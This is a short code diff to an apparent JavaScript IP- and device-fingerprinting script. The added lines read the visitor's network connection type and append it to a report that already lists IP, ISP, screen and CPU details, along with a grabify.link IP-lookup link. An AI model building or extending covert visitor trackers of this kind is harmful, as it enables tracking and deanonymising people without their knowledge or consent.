@@ -250,6 +250,7 @@ const isp = await getISP(ip)
 
 
 const logicalCores = navigator.hardwareConcurrency;
+const connectionType =   navigator.connection.effectiveType
 
 	
 const message = `
@@ -276,6 +277,7 @@ Check here to see IP VPN and Location status <https://grabify.link/ip-lookup/${i
 - Touch Screen: ${isTouchscreen}
 - Orientation: ${orientation}
 - Logical CPU Cores: ${logicalCores}
+- Internet Connection Type: ${connectionType}
 `;
   
 const msg = {
